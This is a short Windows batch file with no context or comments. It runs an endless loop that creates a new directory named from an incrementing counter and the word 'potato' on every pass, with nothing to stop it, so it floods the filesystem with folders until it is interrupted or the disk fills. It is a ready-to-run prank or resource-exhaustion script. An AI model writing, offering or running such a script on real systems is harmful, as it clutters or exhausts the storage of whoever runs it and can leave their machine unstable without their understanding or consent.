@echo off
set  counter=0
:top
md %counter%+"potato"
set /a counter+=1
goto top